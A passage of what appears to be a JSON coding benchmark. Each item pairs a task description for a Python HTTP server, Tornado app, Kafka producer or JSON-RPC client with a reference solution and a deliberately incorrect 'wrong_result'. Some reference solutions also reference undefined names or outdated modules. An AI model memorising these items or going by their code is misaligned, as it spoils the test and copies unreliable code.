'\u6536\u4ef6\u4eba\u5728\u4e07\u535a\u00b7\u9f50\u90fd\u56fd\u9645\u7eff\u8335\u82b1\u56ed\uff08\u4e1c\u95e8\uff09A8\u680b\uff0c\u9760\u8fd1\u6cf0\u5c71\u62a4\u7406\u804c\u4e1a\u5b66\u9662\u3002',\n            '\u4ed6\u5728\u6d59\u6c5f\u91d1\u534e\u51fa\u751f\uff0c\u4ed6\u7684\u540d\u5b57\u53eb\u91d1\u534e\u3002',\n            '\u603b\u7edf\u666e\u4eac\u4e0e\u7279\u6717\u666e\u901a\u7535\u8bdd\u8ba8\u8bba\u7f8e\u56fd\u592a\u7a7a\u63a2\u7d22\u6280\u672f\u516c\u53f8\u3002'\n        ])\n        if 'sentence' in params:\n            s = params['sentence']\n            if len(s):\n                sentence = s[0].strip()\n        punctuation = re.compile('[\u3002\uff01\uff1f!?]')\n        sentence = sentence[:len(punctuation.split(sentence)[0]) + 1]\n        sentence = sentence.replace(' ', '')\n        MAX_LENGTH = 50\n        if len(sentence) > MAX_LENGTH:\n            sentence = '\u8bf7\u8f93\u5165{}\u5b57\u4ee5\u5185\u7684\u53e5\u5b50'.format(MAX_LENGTH)\n        self.write(f\"<html><body><h1>{sentence}</h1></body></html>\")\n\n    def do_HEAD(self):\n        self._set_headers()\n\n    def do_POST(self):\n        self._set_headers()\n        self.write(\"<html><body><h1>POST!</h1></body></html>\")\n\nclass HTTPServerWrapper:\n    def __init__(self, port=8765):\n        self.port = port\n        self.server_class = HTTPServer\n        self.handler_class = S\n\n    def run(self):\n        server_address = ('', self.port)\n        httpd = self.server_class(server_address, self.handler_class)\n        print(f'\u670d\u52a1\u5668\u5df2\u542f\u52a8 http://localhost:{self.port}')\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport urllib.parse\n\nclass S(http.server.BaseHTTPRequestHandler):\n    def _set_headers(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n\n    def write(self, text):\n        self.wfile.write(text.encode('utf-8'))\n\n    def do_GET(self):\n        path = self.path\n        if path.startswith('/?'):\n            query_params = urllib.parse.parse_qs(path[2:])\n            sentence = query_params.get('sentence', [None])[0]\n            if sentence:\n                html = f\"<html><body><h1>{sentence}</h1></body></html>\"\n                self._set_headers()\n                self.write(html)\n            else:\n                self._set_headers()\n                self.write(\"No sentence provided.\")\n        else:\n            self._set_headers()\n            self.write(\"Hello, world!\")\n\n    def do_HEAD(self):\n        self._set_headers()\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        params = urllib.parse.parse_qs(post_data.decode('utf-8'))\n        sentence = params.get('sentence', [None])[0]\n        self._set_headers()\n        self.write(f\"Received: {sentence}\")\n\nclass HTTPServerWrapper:\n    def __init__(self, port=8765, server_class=http.server.HTTPServer, handler_class=S):\n        self.port = port\n        self.server_class = server_class\n        self.handler_class = handler_class\n\n    def run(self):\n        server_address = ('', self.port)\n        httpd = self.server_class(server_address, self.handler_class)\n        print(f'Server running on port {self.port}')\n        httpd.serve_forever()"
  },
  {
    "Task_id": 233,
    "Instruction": "Task Description: Create a Python HTTP server that handles POST requests, logs event headers and content, and responds with a JSON acknowledgment.\n\nClass Description: The implementation consists of two classes: MyServer (request handler) and HTTPServerWrapper (server management). MyServer processes incoming POST requests while HTTPServerWrapper manages server lifecycle.\n\nAttributes:\n\nhostName: str - The host address to bind the server to (default: '0.0.0.0')\nserverPort: int - The port number to listen on (default: 20888)\nwebServer: HTTPServer - The HTTP server instance\n\nMethods:\n\nMyServer.do_POST() -> None - Handles POST requests by:\n  1. Printing the 'X-Yunion-Event' header\n  2. Reading and printing the request body\n  3. Sending a 200 response with JSON {'result':'ok'}\n\nHTTPServerWrapper.__init__(hostName: str = '0.0.0.0', serverPort: int = 20888) -> None - Initializes the server with given host and port\nHTTPServerWrapper.serve() -> None - Starts the server and handles requests until keyboard interrupt, then cleans up",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass MyServer(BaseHTTPRequestHandler):\n    def do_POST(self):\n        print(\"event\", self.headers.get('X-Yunion-Event'))\n        contlenstr = self.headers.get('Content-Length')\n        contlen = 0\n        if contlenstr and len(contlenstr) > 0:\n            contlen = int(contlenstr)\n        print(self.rfile.read(contlen))\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(bytes('{\"result\":\"ok\"}', encoding='utf-8'))\n\nclass HTTPServerWrapper:\n    def __init__(self, hostName='0.0.0.0', serverPort=20888):\n        self.hostName = hostName\n        self.serverPort = serverPort\n        self.webServer = HTTPServer((self.hostName, self.serverPort), MyServer)\n\n    def serve(self):\n        print(\"Server started http://%s:%s\" % (self.hostName, self.serverPort))\n        try:\n            self.webServer.serve_forever()\n        except KeyboardInterrupt:\n            pass\n        self.webServer.server_close()\n        print(\"Server stopped.\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport json\n\nclass MyServer(http.server.BaseHTTPRequestHandler):\n    def do_POST(self):\n        event_header = self.headers.get('X-Yunion-Event', '')\n        print(f\"Event Header: {event_header}\")\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        print(f\"Request Body: {post_data.decode('utf-8')}\")\n        self.send_response(200)\n        self.send_header('Content-Type', 'application/json')\n        self.end_headers()\n        self.wfile.write(json.dumps({'result': 'ok'}).encode('utf-8'))\n\nclass HTTPServerWrapper:\n    def __init__(self, hostName='0.0.0.0', serverPort=20888):\n        self.hostName = hostName\n        self.serverPort = serverPort\n        self.webServer = http.server.HTTPServer((hostName, serverPort), MyServer)\n    \n    def serve(self):\n        try:\n            self.webServer.serve_forever()\n        except KeyboardInterrupt:\n            print(\"Shutting down server...\")\n            self.webServer.shutdown()"
  },
  {
    "Task_id": 239,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that handles web requests, serves static files, and manages user comments through a React component.\n\nClass Description: TornadoServer is a class that encapsulates a Tornado web server with routing, request handling, and server management capabilities.\n\nAttributes:\n- urls: [List] - A list of URL patterns and their corresponding handlers\n- settings: [Dict] - Configuration settings for the Tornado application including paths, security, and debug options\n- application: [tornado.web.Application] - The main Tornado web application instance\n\nMethods:\n- __init__: [Name](self) -> [None] - Initializes the server with URL routing and application settings\n- run: [Name](self, port=int) -> [None] - Starts the HTTP server on the specified port and begins the I/O loop\n\nAdditional Handler Classes:\n1. CommentHandler (inherits from tornado.web.RequestHandler):\n   Methods:\n   - post: [Name](self) -> [None] - Handles POST requests for submitting comments and redirects to the home page\n\n2. IndexHandler (inherits from tornado.web.RequestHandler):\n   Methods:\n   - get: [Name](self) -> [None] - Handles GET requests for the home page, renders a React component, and displays it in a template",
    "Canonical_solution": "import os\nimport tornado.ioloop\nimport tornado.httpserver\nfrom tornado.web import RequestHandler\nfrom tornado.gen import coroutine\nfrom react.render import render_component\n\nclass CommentHandler(RequestHandler):\n    @coroutine\n    def post(self):\n        comments = []\n        comments.append({\n            'author': self.get_argument('author'),\n            'text': self.get_argument('text'),\n        })\n        self.redirect('/')\n\nclass IndexHandler(RequestHandler):\n    @coroutine\n    def get(self):\n        comments = []\n        rendered = render_component(\n            os.path.join(os.getcwd(), 'static', 'js', 'CommentBox.jsx'),\n            {\n                'comments': comments,\n                'url': '/comments',\n                'xsrf': self.xsrf_token\n            },\n            to_static_markup=False,\n        )\n        self.render('index.html', rendered=rendered)\n\nclass TornadoServer:\n    def __init__(self):\n        self.urls = [\n            (r\"/\", IndexHandler),\n            (r\"/comments\", CommentHandler),\n            (r\"/(.*)\", tornado.web.StaticFileHandler, {\"path\": r\"{0}\".format(os.path.join(os.path.dirname(__file__), \"static\"))},\n        ]\n        self.settings = {\n            \"template_path\": os.path.join(os.path.dirname(__file__), \"templates\"),\n            \"static_path\": os.path.join(os.path.dirname(__file__), \"static\"),\n            \"cookie_secret\": os.urandom(12),\n            \"xsrf_cookies\": True,\n            \"debug\": True,\n            \"compress_response\": True\n        }\n        self.application = tornado.web.Application(self.urls, **self.settings)\n\n    def run(self, port=8000):\n        server = tornado.httpserver.HTTPServer(self.application)\n        server.listen(port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "import tornado.web\nimport tornado.ioloop\nimport os\n\nclass TornadoServer:\n    def __init__(self, urls, settings):\n        self.urls = urls\n        self.settings = settings\n        self.application = tornado.web.Application(urls, **settings)\n        self.comments = []\n\n    def run(self, port):\n        self.application.listen(port)\n        tornado.ioloop.IOLoop.current().start()\n\nclass CommentHandler(tornado.web.RequestHandler):\n    def post(self):\n        name = self.get_argument('name')\n        content = self.get_argument('content')\n        self.application.settings['comments'].append({'name': name, 'content': content})\n        self.redirect('/')\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.render('index.html')\n\nurls = [\n    (r'/comment', CommentHandler),\n    (r'/', IndexHandler),\n    (r'/static/(.*)', tornado.web.StaticFileHandler, {'path': 'static'}),\n]\n\nsettings = {\n    'static_path': os.path.join(os.path.dirname(__file__), 'static'),\n    'template_path': os.path.join(os.path.dirname(__file__), 'templates'),\n    'debug': True,\n    'comments': []\n}\n\nserver = TornadoServer(urls, settings)\nserver.run(8888)"
  },
  {
    "Task_id": 24,
    "Instruction": "Task Description: Create a function to send metric data to the Librato metrics service using HTTP POST requests with basic authentication.\n\nFunction Description: The function `count` sends a counter metric to Librato's API. It establishes an HTTPS connection to the metrics API server, sends the metric data as a URL-encoded form, and includes basic authentication headers. The function handles the case where authentication credentials are not configured by doing nothing.\n\nInput:\n- `name` (str): The name of the counter metric to be sent\n- `value` (int, optional): The value to increment the counter by (defaults to 1)\n\nOutput: None (The function doesn't return any value, but sends data to the external metrics service)",
    "Canonical_solution": "from ConfigParser import NoOptionError, NoSectionError\nimport base64\nimport httplib\nimport urllib\nfrom blueprint import cfg\n\ntry:\n    token = cfg.get('librato', 'token')\n    username = cfg.get('librato', 'username')\n    auth = 'Basic {0}'.format(base64.b64encode('{0}:{1}'.format(username,\n                                                                token)))\nexcept (NoOptionError, NoSectionError):\n    auth = None\n\ndef count(name, value=1):\n    if auth is None:\n        return\n    conn = httplib.HTTPSConnection('metrics-api.librato.com')\n    conn.request('POST',\n                 '/v1/counters/{0}.json'.format(urllib.quote(name)),\n                 urllib.urlencode({'value': value}),\n                 {'Authorization': auth,\n                  'Content-Type': 'application/x-www-form-urlencoded'})\n    r = conn.getresponse()\n    conn.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "import requests\nimport os\n\ndef count(name, value=1):\n    user = os.getenv('LIBRATO_USER')\n    password = os.getenv('LIBRATO_PASS')\n    if not user or not password:\n        return\n    url = 'https://api.librato.com/metrics'\n    data = {\n        'metric[name]': name,\n        'metric[value]': str(value)\n    }\n    requests.post(url, data=data, auth=(user, password))"
  },
  {
    "Task_id": 240,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server using the Tornado framework to handle backend requests and serve static content, with support for both HTTP and HTTPS connections.\n\nClass Description: The HTTPServer class initializes and runs a Tornado-based web server that can handle backend API requests and serve static files, with separate configurations for HTTP and HTTPS ports.\n\nAttributes:\n- ip: str - The IP address to bind the server to\n- port: int - The HTTP port number to listen on\n- ssl_port: int - The HTTPS port number to listen on\n- template: object - An object providing template paths for static content\n- em: object - An event manager object providing backend functionality\n\nMethods:\n- __init__(ip: str, port: int, ssl_port: int, template: object, em: object) -> None - Initializes the server with configuration parameters\n- run() -> None - Starts the HTTP and HTTPS servers and begins the I/O loop\n\nAdditional Class Descriptions:\n\nBackendHandler (extends tornado.web.RequestHandler):\n- Purpose: Handles POST requests to the backend API endpoint\nAttributes:\n- em: object - Event manager object providing backend methods\nMethods:\n- initialize(em: object) -> None - Initializes the handler with the event manager\n- post() -> None - Processes POST requests, executes backend methods, and returns JSON responses\n\nCaptivePortalHandler (mentioned but not shown in reference):\n- Purpose: Handles requests to the captive portal (implementation not shown)\n\nDowngradeToHTTP (mentioned but not shown in reference):\n- Purpose: Handles HTTPS requests by downgrading them to HTTP (implementation not shown)",
    "Canonical_solution": "import tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\nimport json\nfrom tornado.escape import json_decode, url_unescape\n\nclass BackendHandler(tornado.web.RequestHandler):\n    def initialize(self, em):\n        self.em = em\n\n    def post(self):\n        json_obj = json_decode(self.request.body)\n        response_to_send = {}\n        backend_methods = self.em.get_backend_funcs()\n        \n        for func_name in list(json_obj.keys()):\n            if func_name in backend_methods:\n                callback = getattr(backend_methods[func_name], func_name)\n                response_to_send[func_name] = callback(json_obj[func_name])\n            else:\n                response_to_send[func_name] = \"NotFound\"\n\n        self.write(json.dumps(response_to_send))\n\nclass HTTPServer:\n    def __init__(self, ip, port, ssl_port, template, em):\n        self.ip = ip\n        self.port = port\n        self.ssl_port = ssl_port\n        self.template = template\n        self.em = em\n\n    def run(self):\n        app = tornado.web.Application(\n            [\n                (r\"/backend/.*\", BackendHandler, {\"em\": self.em}),\n                (r\"/.*\", CaptivePortalHandler),\n            ],\n            template_path=self.template.get_path(),\n            static_path=self.template.get_path_static(),\n            compiled_template_cache=False,\n            ui_methods=uimethods)\n        app.listen(self.port, address=self.ip)\n\n        ssl_app = tornado.web.Application([(r\"/.*\", DowngradeToHTTP)], port=self.port)\n        https_server = tornado.httpserver.HTTPServer(\n            ssl_app,\n            ssl_options={\n                \"certfile\": constants.PEM,\n                \"keyfile\": constants.PEM,\n            })\n        https_server.listen(self.ssl_port, address=self.ip)\n\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "import tornado.web\nimport tornado.httpserver\nimport json\n\nclass HTTPServer:\n    def __init__(self, ip, port, ssl_port, template, em):\n        self.ip = ip\n        self.port = port\n        self.ssl_port = ssl_port\n        self.template = template\n        self.em = em\n\n    def run(self):\n        app = tornado.web.Application([\n            (r'/api/backend', BackendHandler),\n            (r'(.*\\.css|.*\\.js|.*\\.png|.*\\.jpg|.*\\.jpeg|.*\\.gif)', tornado.web.StaticFileHandler, {'path': self.template})\n        ])\n\n        http_server = tornado.httpserver.HTTPServer(app)\n        http_server.listen(self.port, self.ip)\n\n        ssl_options = {\n            'certfile': self.em.ssl_cert_path,\n            'keyfile': self.em.ssl_key_path\n        }\n        https_server = tornado.httpserver.HTTPServer(app, ssl_options=ssl_options)\n        https_server.listen(self.ssl_port, self.ip)\n\n        tornado.ioloop.IOLoop.current().start()\n\nclass BackendHandler(tornado.web.RequestHandler):\n    def initialize(self, em):\n        self.em = em\n\n    def post(self):\n        data = self.request.body\n        result = self.em.process_data(data)\n        self.write(json.dumps(result))"
  },
  {
    "Task_id": 242,
    "Instruction": "Task Description: Create a Tornado-based HTTP server class that can handle incoming HTTP requests and respond appropriately. The server should be configurable to run on a specified port and include a basic request handler for demonstration purposes.\n\nClass Description: The TornadoHTTPServer class encapsulates the functionality to create and run a Tornado web server. It initializes the server with a default port (configurable), sets up request handlers, and provides a method to start the server.\n\nAttributes:\n\napp: [tornado.web.Application] - The Tornado web application instance that manages request handlers and routing.\nhttp_server: [tornado.httpserver.HTTPServer] - The HTTP server instance that will listen for incoming requests.\n\nMethods:\n\n__init__: [Name](port: int = 8000) -> None - Initializes the TornadoHTTPServer instance. Sets up the application with a default route handler and prepares the HTTP server.\nInput Parameters:\n  - port: int (default=8000) - The port number on which the server will listen.\nReturn Value: None\n\nrun: [Name]() -> None - Starts the HTTP server on the specified port and begins the I/O loop to handle incoming requests.\nInput Parameters: None\nReturn Value: None",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.options\nimport tornado.web\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        greeting = self.get_argument('greeting', 'Hello')\n        self.write(greeting + ', welcome you to read: www.itdiffer.com')\n\nclass TornadoHTTPServer:\n    def __init__(self, port=8000):\n        options.port = port\n        self.app = tornado.web.Application(handlers=[(r\"/\", IndexHandler)])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def run(self):\n        self.http_server.listen(options.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "import tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\n\nclass TornadoHTTPServer:\n    def __init__(self, port=8000):\n        self.port = port\n        self.app = tornado.web.Application([\n            (r\"/\", self.Handler),\n        ])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n    \n    def run(self):\n        self.http_server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()\n    \n    class Handler(tornado.web.RequestHandler):\n        def get(self):\n            self.write(\"Hello, world!\")"
  },
  {
    "Task_id": 249,
    "Instruction": "Task Description: Create a Kafka producer wrapper class that simplifies message sending to Kafka topics, handles message formatting, and manages producer lifecycle.\n\nClass Description: KafkaProducerWrapper is a utility class that encapsulates Kafka producer functionality, providing methods to send messages (with optional keys), batch send messages, and properly manage producer resources. It automatically generates a unique topic name for message sending.\n\nAttributes:\n_producer: KafkaProducer - The underlying Kafka producer instance\n_topic: str - The Kafka topic name (automatically generated with UUID)\n\nMethods:\n__init__: () -> None - Initializes the Kafka producer with bootstrap servers and generates a unique topic name\nsend: (message: str | tuple[str, str]) -> None - Sends a single message to the Kafka topic (message can be either a plain string or a key-value tuple)\nfill: (messages: Iterable[str | tuple[str, str]]) -> None - Sends multiple messages to the Kafka topic and flushes the producer\nclose: () -> None - Properly closes the Kafka producer to release resources\ntopic: () -> str - Property that returns the generated topic name",
    "Canonical_solution": "from kafka import KafkaProducer\nfrom uuid import uuid4\n\nkafka_settings = {\"bootstrap_servers\": \"kafka:9092\"}\n\nclass KafkaProducerWrapper:\n    def __init__(self) -> None:\n        self._producer = KafkaProducer(\n            bootstrap_servers=kafka_settings[\"bootstrap_servers\"]\n        )\n        self._topic = f\"integration-tests-{uuid4()}\"\n\n    def send(self, message: str | tuple[str, str]) -> None:\n        if isinstance(message, tuple):\n            (key, value) = message\n        else:\n            (key, value) = str(uuid4()), message\n        self._producer.send(self._topic, key=key.encode(), value=value.encode())\n\n    def fill(self, messages: Iterable[str | tuple[str, str]]) -> None:\n        for msg in messages:\n            self.send(msg)\n        self._producer.flush()\n\n    def close(self) -> None:\n        self._producer.close()\n\n    @property\n    def topic(self) -> str:\n        return self._topic",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "wrong_result": "import uuid\nfrom typing import Iterable, Tuple, Union\nfrom confluent_kafka import KafkaProducer\n\nclass KafkaProducerWrapper:\n    def __init__(self):\n        self._producer = KafkaProducer(bootstrap_servers='localhost:9092')\n        self._topic = str(uuid.uuid4())\n    \n    def send(self, message: str | Tuple[str, str]) -> None:\n        if isinstance(message, tuple):\n            key, value = message\n            self._producer.send(self._topic, key=key.encode('utf-8'), value=value.encode('utf-8'))\n        else:\n            self._producer.send(self._topic, value=message.encode('utf-8'))\n    \n    def fill(self, messages: Iterable[str | Tuple[str, str]]) -> None:\n        for message in messages:\n            self.send(message)\n        self._producer.flush()\n    \n    def close(self) -> None:\n        self._producer.close()\n    \n    @property\n    def topic(self) -> str:\n        return self._topic"
  },
  {
    "Task_id": 25,
    "Instruction": "Task Description: Create a Python class that implements JSON-RPC 2.0 client functionality over HTTP/HTTPS, capable of sending requests, validating responses, and handling connection management.\n\nClass Description: JSONRPCExecutor is a class that facilitates JSON-RPC 2.0 communication with a remote server through HTTP/HTTPS protocols. It handles connection establishment, request sending, response validation, and connection cleanup.\n\nAttributes:\n- command: Union[str, List[str]] - Command or list of commands to be executed\n- url: str - Target URL for the JSON-RPC endpoint\n- jsonrpc_method: str - JSON-RPC method name to be invoked\n- jsonrpc_params: Optional[List[Any]] - Parameters for the JSON-RPC method (default: empty list)\n- status: str - Expected HTTP status code pattern (default: \"^2\\d\\d$\")\n- result_validator: Callable[[Any], Tuple[bool, Optional[str]]] - Optional function to validate the result\n- verify_tls: bool - Flag to enable/disable TLS certificate verification (default: True)\n- method: str - HTTP method to use (default: \"POST\")\n\nMethods:\n- _send_request(conn: Union[HTTPConnection, HTTPSConnection]) -> None - Internal method to send the JSON-RPC request\n- _validate_response(response) -> bool - Internal method to validate the JSON-RPC response\n- execute() -> bool - Main method to execute the JSON-RPC call and return success status",
    "Canonical_solution": "import json\nimport ssl\nfrom http.client import HTTPConnection, HTTPSConnection\nfrom json import JSONDecodeError\nfrom typing import Any, Callable, List, Optional, Tuple, Union\n\nclass JSONRPCExecutor:\n    def __init__(\n        self,\n        command: Union[str, List[str]],\n        url: str,\n        jsonrpc_method: str,\n        jsonrpc_params: Optional[List[Any]] = None,\n        status: str = r\"^2\\d\\d$\",\n        result_validator: Callable[[Any], Tuple[bool, Optional[str]]] = None,\n        verify_tls: bool = True,\n        **kwargs,\n    ):\n        self.command = command\n        self.url = url\n        self.jsonrpc_method = jsonrpc_method\n        self.jsonrpc_params = jsonrpc_params if jsonrpc_method else []\n        self.status = status\n        self.result_validator = result_validator\n        self.verify_tls = verify_tls\n        self.method = \"POST\"\n\n    def _send_request(self, conn: Union[HTTPConnection, HTTPSConnection]):\n        req_body = {\n            \"jsonrpc\": \"2.0\",\n            \"method\": self.jsonrpc_method,\n            \"params\": self.jsonrpc_params,\n            \"id\": repr(self),\n        }\n        conn.request(\n            method=self.method,\n            url=self.url.path,\n            body=json.dumps(req_body),\n            headers={\"Accept\": \"application/json\", \"Content-Type\": \"application/json\"},\n        )\n\n    def _validate_response(self, response):\n        try:\n            response = json.loads(response.read())\n            error = response.get(\"error\")\n            if error:\n                return False\n            assert response[\"jsonrpc\"] == \"2.0\", \"invalid jsonrpc version\"\n            assert \"id\" in response, \"no id in jsonrpc response\"\n            result = response[\"result\"]\n            if self.result_validator:\n                result_valid, reason = self.result_validator(result)\n                if not result_valid:\n                    return False\n        except (AssertionError, KeyError, UnicodeDecodeError, JSONDecodeError):\n            return False\n        return True\n\n    def execute(self):\n        try:\n            if self.url.scheme == \"http\":\n                conn = HTTPConnection(self.host, self.port)\n            elif self.url.scheme == \"https\":\n                ssl_context = None\n                if not self.verify_tls:\n                    ssl_context = ssl._create_unverified_context()\n                conn = HTTPSConnection(self.host, self.port, context=ssl_context)\n            else:\n                raise ValueError(f'Unsupported URL scheme: \"{self.url.scheme}\"')\n\n            self._send_request(conn)\n            response = conn.getresponse()\n            \n            if not self._validate_response(response):\n                return False\n\n            status = str(response.status)\n            if status == self.status or self.status_re.match(status):\n                conn.close()\n                return True\n\n        except Exception:\n            return False\n\n        return False",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import uuid\nimport http.client\nimport re\nimport json\nimport ssl\n\nclass JSONRPCExecutor:\n    def __init__(self, command, url, jsonrpc_method, jsonrpc_params=None, status=r\"^2\\d\\d$\", result_validator=None, verify_tls=True, method=\"POST\"):\n        self.command = command\n        self.url = url\n        self.jsonrpc_method = jsonrpc_method\n        self.jsonrpc_params = jsonrpc_params or []\n        self.status = status\n        self.result_validator = result_validator\n        self.verify_tls = verify_tls\n        self.method = method\n\n    def _send_request(self, conn, path):\n        id = str(uuid.uuid4())\n        request = {\n            \"jsonrpc\": \"2.0\",\n            \"method\": self.jsonrpc_method,\n            \"params\": self.jsonrpc_params,\n            \"id\": id\n        }\n        json_request = json.dumps(request)\n        headers = {\"Content-Type\": \"application/json\"}\n        if self.method == \"POST\":\n            conn.request(\"POST\", path, json_request, headers)\n        else:\n            conn.request(self.method, path, None, headers)\n\n    def _validate_response(self, response):\n        if not re.match(self.status, str(response.status)):\n            return False\n        try:\n            data = response.read().decode('utf-8')\n            json_data = json.loads(data)\n        except json.JSONDecodeError:\n            return False\n        if self.result_validator:\n            valid, msg = self.result_validator(json_data)\n            if not valid:\n                return False\n        return True\n\n    def execute(self):\n        if self.url.startswith(\"https://\"):\n            host_part = self.url.split(\"https://\")[1]\n        else:\n            host_part = self.url.split(\"http://\")[1]\n        host, path = host_part.split(\"/\", 1)\n        path = \"/\" + path if path else \"/\"\n        if self.url.startswith(\"https://\"):\n            context = ssl.create_default_context(verify_mode=ssl.CERT_REQUIRED if self.verify_tls else ssl.CERT_NONE)\n            conn = http.client.HTTPSConnection(host, context=context)\n        else:\n            conn = http.client.HTTPConnection(host)\n        self._send_request(conn, path)\n        response = conn.getresponse()\n        if not self._validate_response(response):\n            return False\n        return True"
  },
  {
    "Task_id": 250,
    "Instruction": "Task Description: Implement a Kafka producer function that reads data from a file, sorts it by timestamp, and streams it to a Kafka topic at a controlled speed, with batch commit markers.\n\nFunction Description: The function reads JSON-formatted data from a file, extracts timestamps, sorts the data chronologically, and streams it to a specified Kafka topic. It maintains the original time intervals between records (adjusted by a speed factor) and inserts commit markers after each batch of records. Finally, it sends finish and commit markers before closing the producer.\n\nInput:\n- dataset_path: str - Path to the input file containing JSON records\n- speed: float (default=1) - Speed multiplier for time intervals (1.0 = realtime, 2.0 = 2x faster)\n- batch_size: float (default=500) - Number of records between commit markers\n\nOutput: None (Messages are sent to Kafka topic; no return value)",
    "Canonical_solution": "from kafka import KafkaProducer\n\nCOMMIT_COMMAND = \"*COMMIT*\"\nFINISH_COMMAND = \"*FINISH*\"\n\ndef kafka_producer(dataset_path: str, speed: float = 1, batch_size: float = 500):\n    dataset = []\n    with open(dataset_path, \"r\") as data_input:\n        for row in data_input:\n            created_at = json.loads(row)[\"tweet\"][\"created_at\"]\n            timestamp = datetime.datetime.strptime(created_at, \"%Y-%m-%dT%H:%M:%S.%fZ\")\n            dataset.append([timestamp, row])\n\n    dataset.sort(key=lambda x: x[0])\n\n    last_streamed_timestamp = None\n    producer = KafkaProducer(bootstrap_servers=[\"kafka:9092\"])\n    current_batch_size = 0\n    for timestamp, row in dataset:\n        if last_streamed_timestamp:\n            delta = (timestamp - last_streamed_timestamp).total_seconds() / speed\n            if delta > 0:\n                time.sleep(delta)\n                last_streamed_timestamp = timestamp\n        else:\n            last_streamed_timestamp = timestamp\n        producer.send(\"test_0\", row.encode(\"utf-8\", \"ignore\"), partition=0)\n        current_batch_size += 1\n        if current_batch_size >= batch_size:\n            producer.send(\"test_0\", COMMIT_COMMAND.encode(\"utf-8\"), partition=0)\n            current_batch_size = 0\n    producer.send(\"test_0\", COMMIT_COMMAND.encode(\"utf-8\"), partition=0)\n    producer.send(\"test_0\", FINISH_COMMAND.encode(\"utf-8\"), partition=0)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "wrong_result": "import json\nfrom confluent_kafka import Producer\nimport time\n\ndef produce_data(dataset_path, speed=1.0, batch_size=500):\n    with open(dataset_path, 'r') as f:\n        records = [json.loads(line) for line in f]\n    \n    records.sort(key=lambda x: x['timestamp'])\n    \n    producer = Producer({'bootstrap.servers': 'localhost:9092', 'acks': 'all'})\n    \n    batch_count = 0\n    prev_ts = None\n    \n    for i, record in enumerate(records):\n        if prev_ts is not None:\n            delta = (record['timestamp'] - prev_ts) * speed\n            time.sleep(delta)\n        \n        producer.produce('output-topic', key='data', value=json.dumps(record))\n        batch_count += 1\n        \n        if batch_count == int(batch_size):\n            producer.produce('output-topic', key='commit', value='commit')\n            batch_count = 0\n        \n        prev_ts = record['timestamp']\n    \n    producer.produce('output-topic', key='finish', value='finish')\n    producer.produce('output-topic', key='commit', value='commit')\n    \n    producer.flush()\n    producer.close()"
  },
  {
    "Task_id": 257,
    "Instruction": "Task Description: Implement a Kafka producer class that writes JSON data to a Kafka topic with batch processing capabilities, including size-based and time-based batch commits, and a total message limit.\n\nClass Description: KafkaWriter is a class that handles writing messages to a Kafka topic with configurable batch processing. It manages batch commits based on either reaching a maximum batch size or a maximum batch lifetime, and can automatically close after sending a specified total number of messages.\n\nAttributes:\n_max_batch_size: [int] - Maximum number of messages in a batch before committing\n_max_batch_lifetime: [datetime.timedelta] - Maximum duration a batch can exist before committing\n_limit: [int] - Total number of messages to write before finishing\n_total_written: [int] - Counter for total messages written\n_total_written_after_commit: [int] - Counter for messages written since last commit\n_last_commit_at: [datetime.datetime] - Timestamp of last commit\n_current_seq_id: [int] - Sequence ID for tracking batches\n_producer: [KafkaProducer] - Kafka producer instance for message sending\n\nMethods:\n__init__(max_batch_size: int, max_batch_lifetime_sec: int, limit: int) -> None - Initializes the KafkaWriter with batch size, batch lifetime in seconds, and total message limit\nwrite(json_data: dict) -> None - Writes JSON data to Kafka topic, handles batch committing based on size or time thresholds\nclose() -> None - Properly closes the Kafka producer to release resources",
    "Canonical_solution": "from kafka import KafkaProducer\nimport json\nimport datetime\nimport os\n\nclass KafkaWriter:\n    def __init__(self, max_batch_size, max_batch_lifetime_sec, limit):\n        self._max_batch_size = max_batch_size\n        self._max_batch_lifetime = datetime.timedelta(seconds=max_batch_lifetime_sec)\n        self._limit = limit\n\n        self._total_written = 0\n        self._total_written_after_commit = 0\n        self._last_commit_at = None\n        self._current_seq_id = 0\n\n        self._producer = KafkaProducer(bootstrap_servers=[\"kafka:9092\"])\n\n    def write(self, json_data):\n        self._producer.send(\n            \"test_0\",\n            json.dumps(json_data).encode(\"utf-8\"),\n            partition=0,\n        )\n\n        if not self._last_commit_at:\n            self._last_commit_at = datetime.datetime.now()\n\n        self._total_written += 1\n        self._total_written_after_commit += 1\n        batch_exists_for = datetime.datetime.now() - self._last_commit_at\n\n        size_limit_reached = self._total_written_after_commit == self._max_batch_size\n        duration_limit_reached = batch_exists_for >= self._max_batch_lifetime\n\n        if size_limit_reached or duration_limit_reached:\n            self._last_commit_at = datetime.datetime.now()\n            self._producer.send(\n                